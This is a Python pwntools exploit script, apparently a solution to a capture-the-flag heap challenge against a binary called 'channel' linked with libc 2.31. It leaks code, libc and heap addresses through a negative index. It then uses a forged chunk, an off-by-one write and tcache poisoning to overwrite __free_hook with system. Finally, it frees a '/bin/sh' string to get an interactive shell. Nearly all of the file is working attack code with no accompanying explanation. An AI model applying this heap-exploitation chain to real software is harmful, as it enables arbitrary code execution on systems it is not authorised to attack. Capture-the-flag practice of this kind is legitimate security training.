#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './channel'
context.os = 'linux'
context.arch = 'amd64'
context.timeout = 5

debug = 1
if debug:
    io = process('./channel')
else:
    io = remote('0.0.0.0',10086)

libc = ELF('./libc-2.31.so')

def p(script = '0'):
    if script == '0':
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, script)

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

def cmd(i, prompt=b"# "):
    io.sendlineafter(prompt, i)

def add(size, content=b'\x00'):
    cmd(b'1')
    size = int(hex(size),16) * 8
    io.sendlineafter(b"nel size: ",str(size).encode())
    io.sendafter(b"channel data: ", content)

def show(idx):
    cmd(b'2')
    io.sendlineafter(b"index: ",str(idx).encode())

def dele(idx):
    cmd(b'3')
    io.sendlineafter(b"index: ",str(idx).encode())

def t2re_t(byte):
    return bin(byte)[:1:-1].ljust(8, '0').encode()

def gx2re_t(great_word):
    return bin(great_word)[:1:-1].ljust(64, '0').encode()

def re_t2int(bitstream):
    return int(bitstream[::-1].decode(), 2)

for i in range(27):
    add(0x410)
show(-11)
log.info("waiting to recvfrom")
pause()
io.recvuntil(b'channel[-11]: ')
code_base = re_t2int(io.recv(64)) - 0x4008
leak("code_base", code_base)
io.recv(64*2)
libc.address = re_t2int(io.recv(64)) - 0x1ec6a0
leak("libc_base", libc.address)
io.recv(64*7)
heap_base = re_t2int(io.recv(64)) - 0x2a0
leak("heap_base", heap_base)
for i in range(27):
    dele(i)
context.log_level = 'debug'

fake_fd = heap_base + 0x2a0
fake_bk = fake_fd
fake_header = gx2re_t(0) + gx2re_t(0x81) + gx2re_t(fake_fd) + gx2re_t(fake_bk) + b'\x00'
add(0x48, fake_header) # 0
add(0x18) # 1
#p()
set_prevsize_off = gx2re_t(0) * 2 + gx2re_t(0x80) + b'0'
add(0x18) # 2, to off by one
add(0x418) # 3 off by oned
add(0x18,gx2re_t(0x68732f6e69622f)+b'\x00') # 4
add(0x18) #5
dele(2)
# off by oneing
add(0x18, set_prevsize_off)

# causing mearge
dele(3)
dele(5) # 1 in tcache
dele(1) # 1 in tcache

# tcache poisoning
add(0x38)
target_addr = libc.sym['__free_hook']
payload = gx2re_t(target_addr) + b'\x00'
add(0x458, payload) # 1
add(0x18)
add(0x18, gx2re_t(libc.sym['system']) +b'\x00')
dele(4)
#p()
io.interactive()
